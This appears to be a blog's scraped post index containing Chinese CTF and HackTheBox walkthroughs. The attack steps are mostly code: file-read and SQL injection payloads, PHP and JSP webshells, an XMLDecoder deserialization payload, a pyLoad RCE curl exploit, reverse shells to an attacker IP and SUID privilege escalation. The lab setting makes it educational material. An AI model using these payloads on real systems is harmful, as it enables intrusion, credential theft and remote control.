执行如下命令，找有suid权限的文件，发现/usr/local/bin/php有suid权限 find / -perm -u=s -type f 2&gt;/dev/null 执行如下命令获取flag php -a mkdir('wa0er');chdir('wa0er');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('/flag')); 参考https://www.cnblogs.com/yesec/p/15211484.html","categories":[{"name":"CTF","slug":"CTF","permalink":"https://wa0er.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://wa0er.github.io/tags/CTF/"}],"author":"wa0er"},{"title":"HTB-Topology","slug":"HTB18-Topology-Easy","date":"2023-09-23T11:00:00.000Z","updated":"2023-09-25T05:21:07.666Z","comments":true,"path":"posts/e1e0c79d.html","link":"","permalink":"https://wa0er.github.io/posts/e1e0c79d.html","excerpt":"","text":"HTB-Topology一、思路概要1.信息收集发现LaTeX公式生成器； 2.LaTeX公式生成器任意文件读取Apache的.htpasswd文件获取SSH账户； 3.SSH连接执行pspy64发现定时任务反弹shell获取root权限。 二、信息收集nmap扫描端口服务 nmap -A 10.10.11.217 80端口开放，直接访问 首页看到有一个LaTeX表达式的超链接 发现子域，添加进本地hosts文件 echo \"10.10.11.217 latex.topology.htb topology.htb\" &gt;&gt; /etc/hosts 三、latex实现任意文件读取google关键词：latex exploit https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection#latex-injection 经过尝试，最终payload如下，读取/etc/passwd文件 $\\lstinputlisting{/etc/passwd}$ 发现另一个用户vdaisley，但是没有口令，扫描子域发现stats和dev子域，都添加到本地hosts文件后，stats子域打开是一张图片，dev子域需要认证 gobuster vhost -u http://topology.htb --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 既然dev子域需要认证，而且通常在Apache服务器中会使用.htpasswd文件存储密码文件，那么vdaisley的口令也极有可能存储在dev子域的.htpasswd文件中，又因为此文件通常位于网站根目录，所以可以用如下payload尝试读取/var/www/dev/.htpasswd文件 $\\lstinputlisting{/var/www/dev/.htpasswd}$ vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0 把hash值写入文件hash，用john爆破 john --wordlist=/usr/share/wordlists/rockyou.txt hash vdaisley:calculus20 SSH连接 四、pspy64发现定时任务反弹shell本地kali开启http服务 python3 -m http.server 80 目标靶机从本地下载pspy64 wget http://10.10.14.8/pspy64 chmod +x pspy64 执行，发现定时任务如下，可通过在/opt/gnuplot目录下新建后缀为.plt的文件，并在文件中写入恶意命令，通过定时任务的/bin/sh -c间接执行 新建文件/opt/gnuplot/shell.plt，内容如下 system \"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.8/9898 0&gt;&amp;1'\" 本地kali开启监听 nc -lvnp 9898 稍等片刻，成功获取root权限 Over！","categories":[{"name":"靶机","slug":"靶机","permalink":"https://wa0er.github.io/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://wa0er.github.io/tags/HackTheBox/"}],"author":"wa0er"},{"title":"JMCTF2021-UploadHub","slug":"CTF15-JMCTF2021-UploadHub","date":"2023-09-22T11:00:00.000Z","updated":"2023-09-26T02:45:59.719Z","comments":true,"path":"posts/1582c14.html","link":"","permalink":"https://wa0er.github.io/posts/1582c14.html","excerpt":"","text":"JMCTF2021-UploadHub知识点概要：文件上传bypass 题目有源码，首页有上传功能 index.php上传功能 文件后缀白名单的变量前面是$allow_type，后面是$type，相当于没过滤，可以上传任意文件，同目录是php代码，那么首先思路就是传php文件 但apache2.conf文件有如下内容，禁用了php解析引擎，所以直接上传php文件行不通 可以传.htaccess文件修改解析配置，直接把.htaccess文件本身按照php解析，.htaccess文件内容如下 &lt;FilesMatch .htaccess&gt; SetHandler application/x-httpd-php Require all granted php_flag engine on &lt;/FilesMatch&gt; php_value auto_prepend_file .htaccess #&lt;?php @eval($_POST['test']);?&gt; 强制所有匹配的文件被一个指定的处理器处理 用法 ForceType application/x-httpd-php SetHandler application/x-httpd-php Require all granted # 允许所有请求 php_flag engine on # 开启PHP解析引擎 php_value auto_prepend_file .htaccess # 在主文件解析之前自动解析包含.htaccess的内容 根据index.php代码逻辑，文件上传好后，文件路径会打印到&lt;img&gt;标签的src属性值 上传成功后，右键查看页面源码，在&lt;img&gt;标签可看到文件路径，直接点击访问即可 由于start.sh有删除上传文件的定时任务，所以可能需要重新传个几次，不过根据index.php22行，文件路径命名不会变，所以还是省了点事 HackBar POST传参，执行phpinfo()如下 读flag如下 test=var_dump(file_get_contents(\"/flag\")); 参考https://blog.csdn.net/weixin_45669205/article/details/117047432 index.php完整代码&lt;html&gt; &lt;head&gt; &lt;title&gt;生而为人，我很抱歉&lt;/title&gt; &lt;meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\"&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;电影太仁慈，总能让错过的人重新相遇；生活不一样，有的人说过再见就再也不见了 -网易云&lt;/h1&gt; &lt;form action=\"\" method=\"post\" enctype=\"multipart/form-data\"&gt; &lt;label for=\"file\"&gt;filename:&lt;/label&gt; &lt;input type=\"file\" name=\"file\" id=\"file\" /&gt; &lt;input type=\"submit\" name=\"submit\" value=\"submit\" /&gt; &lt;/form&gt; &lt;?php error_reporting(0); session_start(); include('config.php'); $upload = 'upload/'.md5(\"shuyu\".$_SERVER['REMOTE_ADDR']); @mkdir($upload); file_put_contents($upload.'/index.html', ''); if(isset($_POST['submit'])){ $allow_type=array(\"jpg\",\"gif\",\"png\",\"bmp\",\"tar\",\"zip\"); $fileext = substr(strrchr($_FILES['file']['name'], '.'), 1); if ($_FILES[\"file\"][\"error\"] &gt; 0 &amp;&amp; !in_array($fileext,$type) &amp;&amp; $_FILES[\"file\"][\"size\"] &gt; 204800){ die('upload error'); }else{ $filename=addslashes($_FILES['file']['name']); $sql=\"insert into img (filename) values ('$filename')\"; $conn-&gt;query($sql); $sql=\"select id from img where filename='$filename'\"; $result=$conn-&gt;query($sql); if ($result-&gt;num_rows &gt; 0) { while($row = $result-&gt;fetch_assoc()) { $id=$row[\"id\"]; } move_uploaded_file($_FILES[\"file\"][\"tmp_name\"],$upload.'/'.$filename); header(\"Location: index.php?id=$id\"); } } } elseif (isset($_GET['id'])){ $id=intval($_GET['id']); $sql=\"select filename from img where id=$id\"; $result=$conn-&gt;query($sql); if ($result-&gt;num_rows &gt; 0) { while($row = $result-&gt;fetch_assoc()) { $filename=$row[\"filename\"]; } $img=$upload.'/'.$filename; echo \"&lt;img src='$img'/&gt;\"; } } ?&gt; &lt;style&gt; body{ background:url(./back.jpg) no-repeat right -160px ; background-size:90%; background-attachment:fixed; background-color: rgba(255, 255, 255, 0.8); } &lt;/style&gt; &lt;/body&gt; &lt;/html&gt;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://wa0er.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://wa0er.github.io/tags/CTF/"}],"author":"wa0er"},{"title":"JMCTF2021-GoOSS","slug":"CTF14-JMCTF2021-GoOSS","date":"2023-09-20T11:00:00.000Z","updated":"2023-09-26T02:26:08.104Z","comments":true,"path":"posts/2cfe146d.html","link":"","permalink":"https://wa0er.github.io/posts/2cfe146d.html","excerpt":"","text":"JMCTF2021-GoOSS知识点概要：URL重定向漏洞、SSRF 题目有源码，本文末尾有完整代码 gin框架参考： https://www.topgoer.com/gin%E6%A1%86%E6%9E%B6/ https://gin-gonic.com/zh-cn/docs/examples/ /vul路由关键代码 上半部分ShouldBindJSON是json数据的绑定，下半部分url.Url相当于从json数据中取出url键值对，前缀如果不是http://127.0.0.1:1234/，就返回403报错 关于json数据绑定可参考：https://gin-gonic.com/zh-cn/docs/examples/binding-and-validation/ 然后看fileMidderware中间件关键代码 URL后缀需要是反斜杠/结尾，如果不是反斜杠结尾，就在URL末尾加上反斜杠，然后302重定向访问URL 所以hackbar传递Payload如下（../多一个少一个都不行） {\"url\":\"http://127.0.0.1:1234//127.0.0.1/?file=/flag&amp;../../../..\"} 这个payload跟LineCTF2022-MemoDrive有几分相像之处，个人猜测最后访问的地址应该是http://127.0.0.1/../../../../flag 参考https://blog.csdn.net/weixin_45805993/article/details/116671017 https://boogipop.com/2023/07/02/BUUCTF%20Web%20WriteUp%207/ 完整代码index.php &lt;?php // php in localhost port 80 readfile($_GET['file']); ?&gt; main.go package main import ( \"bytes\" \"crypto/md5\" \"encoding/hex\" \"github.com/gin-gonic/gin\" \"io\" \"io/ioutil\" \"net/http\" \"os\" \"strings\" \"time\" ) type File struct { Content string `json:\"content\" binding:\"required\"` Name string `json:\"name\" binding:\"required\"` } type Url struct { Url string `json:\"url\" binding:\"required\"` } func md5sum(data string) string{ s := md5.Sum([]byte(data)) return hex.EncodeToString(s[:]) } func fileMidderware (c *gin.Context){ fileSystem := http.Dir(\"./files/\") if c.Request.URL.String() == \"/\"{ c.Next() return } f,err := fileSystem.Open(c.Request.URL.String()) if f == nil { c.Next() } // if err != nil { c.Next() return } defer f.Close() fi, err := f.Stat() if err != nil { c.JSON(http.StatusInternalServerError, gin.H{\"error\": err.Error()}) return } if fi.IsDir() { if !strings.HasSuffix(c.Request.URL.String(), \"/\") { c.Redirect(302,c.Request.URL.String()+\"/\") } else { files := make([]string,0) l,_ := f.Readdir(0) for _,i := range l { files = append(files, i.Name()) } c.JSON(http.StatusOK, gin.H{ \"files\" :files, }) } } else { data,_ := ioutil.ReadAll(f) c.Header(\"content-disposition\", `attachment; filename=` + fi.Name()) c.Data(200, \"text/plain\", data) } } func uploadController(c *gin.Context) { var file File if err := c.ShouldBindJSON(&amp;file); err != nil { c.JSON(500, gin.H{\"msg\": err}) return } dir := md5sum(file.Name) _,err:= http.Dir(\"./files\").Open(dir) if err != nil{ e := os.Mkdir(\"./files/\"+dir,os.ModePerm) _, _ = http.Dir(\"./files\").Open(dir) if e != nil { c.JSON(http.StatusInternalServerError, gin.H{\"error\": e.Error()}) return } } filename := md5sum(file.Content) path := \"./files/\"+dir+\"/\"+filename err = ioutil.WriteFile(path, []byte(file.Content), os.ModePerm) if err != nil{ c.JSON(http.StatusInternalServerError, gin.H{\"error\": err.Error()}) return } c.JSON(200, gin.H{ \"message\": \"file upload succ, path: \"+dir+\"/\"+filename, }) } func vulController(c *gin.Context) { var url Url if err := c.ShouldBindJSON(&amp;url); err != nil { c.JSON(500, gin.H{\"msg\": err}) return } if !strings.HasPrefix(url.Url,\"http://127.0.0.1:1234/\"){ c.JSON(403, gin.H{\"msg\": \"url forbidden\"}) return } client := &amp;http.Client{Timeout: 2 * time.Second} resp, err := client.Get(url.Url) if err != nil { c.JSON(http.StatusInternalServerError, gin.H{\"error\": err.Error()}) return } defer resp.Body.Close() var buffer [512]byte result := bytes.NewBuffer(nil) for { n, err := resp.Body.Read(buffer[0:]) result.Write(buffer[0:n]) if err != nil &amp;&amp; err == io.EOF { break } else if err != nil { c.JSON(http.StatusInternalServerError, gin.H{\"error\": err.Error()}) return } } c.JSON(http.StatusOK, gin.H{\"data\": result.String()}) } func main() { r := gin.Default() r.Use(fileMidderware) r.POST(\"/vul\",vulController) r.POST(\"/upload\",uploadController) r.GET(\"/\", func(c *gin.Context) { c.JSON(200, gin.H{ \"message\": \"pong\", }) }) _ = r.Run(\":1234\") // listen and serve on 0.0.0.0:8080 }","categories":[{"name":"CTF","slug":"CTF","permalink":"https://wa0er.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://wa0er.github.io/tags/CTF/"}],"author":"wa0er"},{"title":"CISCN2021Quals-upload","slug":"CTF13-CISCN2021Quals-upload","date":"2023-09-18T11:00:00.000Z","updated":"2023-09-26T02:26:08.104Z","comments":true,"path":"posts/1e912fcd.html","link":"","permalink":"https://wa0er.github.io/posts/1e912fcd.html","excerpt":"","text":"CISCN2021Quals-upload知识点概要：文件上传、代码审计bypass 首页源码 &lt;?php if (!isset($_GET[\"ctf\"])) { highlight_file(__FILE__); die(); } if(isset($_GET[\"ctf\"])) $ctf = $_GET[\"ctf\"]; if($ctf==\"upload\") { if ($_FILES['postedFile']['size'] &gt; 1024*512) { die(\"这么大个的东西你是想d我吗？\"); } $imageinfo = getimagesize($_FILES['postedFile']['tmp_name']); if ($imageinfo === FALSE) { die(\"如果不能好好传图片的话就还是不要来打扰我了\"); } if ($imageinfo[0] !== 1 &amp;&amp; $imageinfo[1] !== 1) { die(\"东西不能方方正正的话就很讨厌\"); } $fileName=urldecode($_FILES['postedFile']['name']); if(stristr($fileName,\"c\") || stristr($fileName,\"i\") || stristr($fileName,\"h\") || stristr($fileName,\"ph\")) { die(\"有些东西让你传上去的话那可不得了\"); } $imagePath = \"image/\" . mb_strtolower($fileName); if(move_uploaded_file($_FILES[\"postedFile\"][\"tmp_name\"], $imagePath)) { echo \"upload success, image at $imagePath\"; } else { die(\"传都没有传上去\"); } } 文件大小需小于512KB，需是图片，图片宽高需都为1，文件名不能有字符c、i、h、ph（不区分大小写），相当于过滤了.htaccess、.use.ini getimagesize()参考：https://www.runoob.com/php/php-getimagesize.html 使用如下内容绕过图片宽高需都为1的限制 #define width 1 #define height 1 $_FILES数组参考php官方手册：https://www.php.net/manual/zh/features.file-upload.post-method.php $_FILES数组内容如下: &lt;input name=\"userfile\" type=\"file\" /&gt; $_FILES['userfile']['size'] 已上传文件的大小，单位为字节。 $_FILES['userfile']['tmp_name'] 文件被上传后在服务端储存的临时文件名。 $_FILES['userfile']['name'] 客户端机器文件的原名称。 $_FILES['userfile']['type'] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如“image/gif”。 目录扫描得到/example.php文件 &lt;?php if (!isset($_GET[\"ctf\"])) { highlight_file(__FILE__); die(); } if(isset($_GET[\"ctf\"])) $ctf = $_GET[\"ctf\"]; if($ctf==\"poc\") { $zip = new \\ZipArchive(); $name_for_zip = \"example/\" . $_POST[\"file\"]; if(explode(\".\",$name_for_zip)[count(explode(\".\",$name_for_zip))-1]!==\"zip\") { die(\"要不咱们再看看？\"); } if ($zip-&gt;open($name_for_zip) !== TRUE) { die (\"都不能解压呢\"); } echo \"可以解压，我想想存哪里\"; $pos_for_zip = \"/tmp/example/\" . md5($_SERVER[\"REMOTE_ADDR\"]); $zip-&gt;extractTo($pos_for_zip); $zip-&gt;close(); unlink($name_for_zip); $files = glob(\"$pos_for_zip/*\"); foreach($files as $file){ if (is_dir($file)) { continue; } $first = imagecreatefrompng($file); # 由 $file 创建一个新图像 $size = min(imagesx($first), imagesy($first)); $second = imagecrop($first, ['x' =&gt; 0, 'y' =&gt; 0, 'width' =&gt; $size, 'height' =&gt; $size]); # 将图像裁剪到给定的矩形 if ($second !== FALSE) { $final_name = pathinfo($file)[\"basename\"]; # 相当于文件名 imagepng($second, 'example/'.$final_name); imagedestroy($second); } imagedestroy($first); unlink($file); } } 需要传.zip文件，但是首页源码把i这个字母过滤掉了，我们只能思考首页源码第25行mb_strtolower()函数可否利用。可以利用一些unicode字符绕过。经过测试发现 &lt;?php var_dump(mb_strtolower('İ')==='i'); ?&gt; #结果为true，并且首页源码第21行还执行了urldecode。所以可以用%c4%b0代替'İ'字符 为了绕过图片检测，将一句话写入png图片脚本如下（图片隐写技巧）： https://github.com/huntergregal/PNG-IDAT-Payload-Generator/ 在[Entropy - CyberChef](https://gchq.github.io/CyberChef/#recipe=Entropy(‘Shannon scale’))进行如下解码操作（中间Raw Deflate是PNG图片IDAT的压缩算法deflate/inflate，参考：https://vivaxyblog.github.io/2019/12/07/decode-a-png-image-with-javascript-cn.html） 在十六进制编辑器Winhex里修改payload如下 修改前后十六进制值对比如下 5b 3c 3f 3d 24 5f 47 45 54 5b 30 5d 28 24 5f 50 4f 53 54 5b 31 5d 29 3b 3f 3e 58 00 00 5B 3C 3F 3D 45 56 41 4C 28 24 5F 50 4F 53 54 5B 31 5D 29 3B 20 20 20 20 3F 3E 58 00 00 然后再进行编码 a39f67641d201612546f112e29152b2167226b505050506f5f5310 修改代码如下 生成带有payload的a.png，然后修改图片后缀为php并压缩成zip 本地phpstudy开启一个web服务，访问如下代码 &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;title&gt;上传页面&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=\"http://666a12e6-ffb1-4a49-b7cc-ba6766cecb88.node4.buuoj.cn:81/upload.php?ctf=upload\" method=\"post\" enctype=\"multipart/form-data\"&gt; &lt;!--链接是当前打开的题目链接--&gt; &lt;label for=\"file\"&gt;文件名：&lt;/label&gt; &lt;input type=\"file\" name=\"postedFile\" id=\"postedFile\"&gt;&lt;br&gt; &lt;input type=\"submit\" name=\"submit\" value=\"提交\"&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; 在页面中上传a.zip，然后抓包修改如下两个位置，发送请求包即可看到响应上传成功 然后访问/example.php?ctf=poc，并发送post数据，解压a.zip 由example.php文件的第35行代码imagepng($second, 'example/'.$final_name);可知，文件最终路径在/example/a.php，蚁剑访问连接，在/etc子目录下读到flag 参考https://blog.csdn.net/jiangdie666/article/details/116997461","categories":[{"name":"CTF","slug":"CTF","permalink":"https://wa0er.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://wa0er.github.io/tags/CTF/"}],"author":"wa0er"},{"title":"HTB-PC","slug":"HTB17-PC-Easy","date":"2023-09-16T11:00:00.000Z","updated":"2023-09-25T05:21:07.666Z","comments":true,"path":"posts/cbbc48d2.html","link":"","permalink":"https://wa0er.github.io/posts/cbbc48d2.html","excerpt":"","text":"HTB-PC一、思路概要1.端口扫描发现gRPC服务； 2.gRPC存在SQL注入获取到SSH账户； 3.SSH连接查看主机端口服务发现pyLoad服务； 4.pyLoad服务存在RCE（CVE-2023-0297）反弹shell获取root权限。 二、信息收集nmap扫描端口服务 nmap -p- --min-rate 10000 -Pn -sT 10.10.11.214 非常规端口50051，直接浏览器访问是乱码，google发现是gRPC默认端口 google关键字：gRPC exploit https://medium.com/@ibm_ptc_security/grpc-security-series-part-3-c92f3b687dd9 文章大致意思是，有一个SQL注入 工具： grpcurl：https://github.com/fullstorydev/grpcurl grpcui：https://github.com/fullstorydev/grpcui 用grpcurl可以查看一些基本服务，SimpleApp对应有LoginUser、RegisterUser、getInfo三个接口方法 用grpcui工具，执行如下命令，实现与gRPC服务交互 ./grpcui -plaintext 10.10.11.214:50051 自动打开如下web页面，然后打开Burpsuite，捕获下面的操作过程，方便测试SQL注入 在LoginUser接口，弱口令admin:admin成功认证（下面的认证路径是通过观察响应的message，尝试出来的正确认证过程） 得到一个id和token 525 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2OTQ0MDgzMjB9.SH7DanchqAh3QMbI2q8VTH9X1qKX438MtNA8Ixr9TNU 然后到getInfo接口，Request Metadata填入对应的token键值对，Request Data填入id值 点击Invoke之后，响应也是成功的响应 三、gRPC SQL注入在最后getInfo的数据包中，id部分可能存在注入，因为加单引号会有报错提示 把请求包保存为sqltest文件，sqlmap注入，笔者此处sqlmap跑不出，手工可以注出数据 sqlmap -r sqltest -p id -f --batch --dump-all 手工（注意union前id改为一个错误id）： \"id\":\"520 union select sqlite_version(); --+\" #表名，数据库名 \"id\":\"520 union select group_concat(sql) from sqlite_master --+\" #username的值 \"id\":\"520 union select group_concat(username) from accounts --+\" #password \"id\":\"520 union select group_concat(password) from accounts --+\" 新找到一个用户 sau : HereIsYourPassWord1431 SSH连接 netstat -antp查看端口开放情况，有9666端口是开放的，但访问不到，那就尝试把对内开放的8000端口做端口转发 从本地下载chisel 本地kali执行 python3 -m http.server 80 目标靶机执行 wget http://10.10.14.8/chisel chmod +x chisel 建立端口转发 本地kali执行 ./chisel server --port 9898 --reverse 目标靶机执行 ./chisel client -v 10.10.14.8:9898 R:8000:127.0.0.1:8000 本地浏览器访问127.0.0.1:8000 四、pyLoad RCE（CVE-2023-0297）google关键词：pyload exploit https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad 在目标靶机/tmp目录下新建一个shell.sh，写入如下反弹shell脚本 bash -i &gt;&amp; /dev/tcp/10.10.14.8/9899 0&gt;&amp;1 本地kali开启监听nc -lvnp 9899 靶机执行如下命令 curl -i -s -k -X $'POST' \\ --data-binary $'jk=pyimport%20os;os.system(\\\"bash%20/tmp/shell.sh\\\");f=function%20f2(){};&amp;package=xxx&amp;crypted=AAAA&amp;&amp;passwords=aaaa' \\ $'http://127.0.0.1:8000/flash/addcrypted2' 成功获取root权限 Over！","categories":[{"name":"靶机","slug":"靶机","permalink":"https://wa0er.github.io/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://wa0er.github.io/tags/HackTheBox/"}],"author":"wa0er"},{"title":"GKCTF2021-easycms","slug":"CTF12-GKCTF2021-easycms","date":"2023-09-14T11:00:00.000Z","updated":"2023-09-26T02:26:08.098Z","comments":true,"path":"posts/3e3db684.html","link":"","permalink":"https://wa0er.github.io/posts/3e3db684.html","excerpt":"","text":"GKCTF2021-easycms知识点概要：目录穿越、任意代码执行、任意文件下载 题目hint：后台密码5位弱口令 首页 根据题目hint，知道有后台，爆破得后台路径/admin.php 弱口令：admin:12356 思路一（目录穿越&amp;任意代码执行）登录成功后，左侧菜单栏UI→Theme，随便一个主题点击右下角Customize 编辑Header，点击右上角Edit 可以写入php代码，写入&lt;?php phpinfo();?&gt;试试 保存，显示如下，需要创建/var/www/html/system/tmp/saec.txt文件 左侧菜单栏，UI→CMPT→Source List，有个上传功能，随便上传个1.txt（大小不能为0kb） 上传好后，点击右上角编辑 Title文本框填如下内容（../多一层少一层都不行） ../../../../../system/tmp/saec 保存后，再次点击编辑查看，Path已经变成如下图所示，实现目录穿越 再次回到UI→Theme→Customize，按刚才的步骤写入phpinfo代码后，点击右上角Visual Editor 可看到phpinfo已被成功执行 那么同样写入如下代码，查看flag即可 &lt;?php system(\"cat /flag\");?&gt; 思路二（任意文件下载）左侧菜单栏UI→Theme→Customize，点击右上角Export Theme 随便填，点击保存，会自动下载Theme文件 把下载链接复制出来，theme参数值是base64编码 http://f68d3c85-3d68-46dd-a9c3-702d9b2c43d4.node4.buuoj.cn:81/admin.php?m=ui&amp;f=downloadtheme&amp;theme=L3Zhci93d3cvaHRtbC9zeXN0ZW0vdG1wL3RoZW1lL2RlZmF1bHQvMS56aXA= 解码如下 /var/www/html/system/tmp/theme/default/1.zip 那么修改成/flag的base64编码L2ZsYWc= http://f68d3c85-3d68-46dd-a9c3-702d9b2c43d4.node4.buuoj.cn:81/admin.php?m=ui&amp;f=downloadtheme&amp;theme=L2ZsYWc= 访问，下载完成后，记事本打开即可看到flag 参考https://blog.csdn.net/scrawman/article/details/122619270 https://www.cnblogs.com/hiny0/p/15110817.html","categories":[{"name":"CTF","slug":"CTF","permalink":"https://wa0er.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://wa0er.github.io/tags/CTF/"}],"author":"wa0er"},{"title":"GKCTF2021-babycat-revenge","slug":"CTF11-GKCTF2021-babycat-revenge","date":"2023-09-10T11:00:00.000Z","updated":"2023-09-26T02:38:42.514Z","comments":true,"path":"posts/b53475ea.html","link":"","permalink":"https://wa0er.github.io/posts/b53475ea.html","excerpt":"","text":"GKCTF2021-babycat-revenge知识点概要：目录遍历、java审计、XMLDecoder反序列化 题目hint：1.你知道注释符吗 2.PrintWriter？ 首页 注册页面空白，查看注册页面源码如下 对比登录页面源码 ajax请求逻辑大同小异 登录账号口令随便输入，Burp捕获登录页面请求包如下 捕获注册页面请求包，修改为post方法，数据部分模仿登录请求传参，如下 注册成功，登录，页面如下 ROLE是guest，说明我们是游客权限。有一个上传功能和一个下载功能，上传功能如下，响应提示只允许admin权限上传 下载功能的链接明显有问题，极有可能存在目录遍历 Java Web项目，根据常规目录结构，读取web.xml找servlet接口类文件路径 ../../WEB-INF/web.xml 都下载下来 /home/download?file=../classes/com/web/servlet/registerServlet.class uploadServlet.class 用jadx反编译获得源码，审计uploadServlet.class，用户Role需要是admin才能上传，且文件后缀有白名单，文件内容有黑名单，如下图 那么首要目标是绕过Role需要是admin的验证 在registerServlet.class，会对注册时的post参数，即data={\"username\":\"admin\",\"password\":\"admin\"} 做\\\"role\\\":\\\"(.*?)\\\"正则匹配，匹配到\"role\":\"xxx\"就会替换成\"role\":\"guest\"，如果没有role，则设置role为guest，所以必须让while循环里的role有值，使得if条件成立 因为 JSON 中的内联注释来不会影响 JSON 数据解析，所以此处payload如下 data={\"username\":\"admin\",\"password\":\"admin\",\"role\":\"test\",\"role\"/**/:\"admin\"} 或 data={\"username\":\"admin\",\"password\":\"admin\",\"role\":\"admin\"/*,\"role\":\"test\"*/} 第一个payload在while处匹配到\"role\":\"test\"，匹配不到\"role\"/**/:\"admin\"，进到if条件里，替换的是\"role\":\"test\"，json解析时遇到重复的role键时，会使用最后一个role键值对，最终\"role\":\"admin\"； 第二个payload在while处匹配到\"role\":\"admin\"，但第二次while循环匹配到\"role\":\"test\"会覆盖掉第一个\"role\":\"admin\"，进到if条件里，替换的是\"role\":\"test\"，json解析时，由于\"role\":\"test\"被注释，最终\"role\":\"admin\"。 注册成功，登录后，ROLE显示为admin，如下图 在registerServlet.class和loginServlet.class中，有从dao导入的包，下载下来审计 /home/download?file=../classes/com/web/dao/baseDao.class 在com.web.dao.baseDao中，有XMLDecoder()方法，可以尝试将db.xml覆盖为恶意代码后通过登录或注册功能触发XMLDecoder反序列化（追溯调用链，在登录和注册功能代码，都有调用baseDao.getConnection()方法，从而调用getConfig()方法，从而触发XMLDecoder()） 读取环境变量CATALINA_HOME ，其值为 /usr/local/tomcat /home/download?file=../../../../../../proc/self/environ 因为上传白名单有xml，题目hint有PrintWriter，所以恶意代码如下。其中CDATA数据块为蚁剑的jsp马 &lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;java class=\"java.beans.XMLDecoder\"&gt; &lt;object class=\"java.io.PrintWriter\"&gt; &lt;string&gt;/usr/local/tomcat/webapps/ROOT/static/shell.jsp&lt;/string&gt; &lt;void method=\"println\"&gt; &lt;string&gt;&lt;![CDATA[&lt;%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%&gt;&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt;&lt;%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%&gt;]]&gt;&lt;/string&gt; &lt;/void&gt; &lt;void method=\"close\"/&gt; &lt;/object&gt; &lt;/java&gt; 上传文件，文件名改为../db/db.xml 退出用户，重新登录一下，以便触发XMLDecoder，然后蚁剑连接 直接读flag文件没有权限，有个readflag文件，执行，成功获取flag GKCTF2021-babycat参考GKCTF2021-babycat-revenge，唯一的区别在于uploadServlet.class上传逻辑，此处即使进到if条件里，提示upload failed，依然不影响后续代码执行，也就是实际上依然会被上传 if (checkExt(ext) || checkContent(item.getInputStream())) { req.setAttribute(\"error\", \"upload failed\"); req.getRequestDispatcher(\"../WEB-INF/upload.jsp\").forward(req, resp); } String filePath = uploadPath + File.separator + name + ext; File storeFile = new File(filePath); item.write(storeFile); req.setAttribute(\"error\", \"upload success!\"); 把冰蝎jsp马传到../../static/shell.jsp，连接即可（为什么传到这位置，因为download功能那里的任意文件下载，原始位置就是../../static/cat.gif） 参考https://blog.csdn.net/cjdgg/article/details/121325745 https://codex.lemonprefect.cn/writeups/GKCTF%202021.html#babycat","categories":[{"name":"CTF","slug":"CTF","permalink":"https://wa0er.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://wa0er.github.io/tags/CTF/"}],"author":"wa0er"},{"title":"HTB-MonitorsTwo","slug":"HTB16-MonitorsTwo-Easy","date":"2023-09-09T11:00:00.000Z","updated":"2023-09-25T05:21:07.665Z","comments":true,"path":"posts/1ca70420.html","link":"","permalink":"https://wa0er.github.io/posts/1ca70420.html","excerpt":"","text":"HTB-MonitorsTwo一、思路概要1.信息收集发现Cacti框架存在CVE-2022-46169命令注入漏洞； 2.CVE-2022-46169命令注入获取www-data权限； 3.发现mysql数据库和带suid的文件capsh； 4.capsh提权到root（此root非彼root）； 5.数据库查询发现ssh用户； 6.ssh用户连接上去，发现邮件，存在docker漏洞CVE-2021-41091； 7.docker漏洞提权到root。 二、信息收集nmap扫描端口服务 80端口开放，那么访问web端 三、CVE-2022-46169（Cacti命令注入漏洞）google关键字Cacti exploit 找到是CVE-2022-46169 exploit：https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22 本地开启监听，并执行exp nc -lvnp 9898 python3 CVE-2022-46169.py -u http://10.10.11.211 --LHOST=10.10.14.4 --LPORT=9898 获取www-data权限 在/var/www/html/下发现数据库文件cacti.sql，看到有admin用户密码，但实际无法登录主页 根目录有entrypoint.sh，可看到是mysql数据库，有一些数据库命令 执行如下命令，查找有suid权限的文件，看到/sbin/capsh，比较罕见 find / -perm -u=s -type f 2&gt;/dev/null 在shell命令提权手册里找到提权用法如下 https://gtfobins.github.io/gtfobins/capsh/#suid /sbin/capsh --gid=0 --uid=0 -- 提权到了root，但是此root非彼root 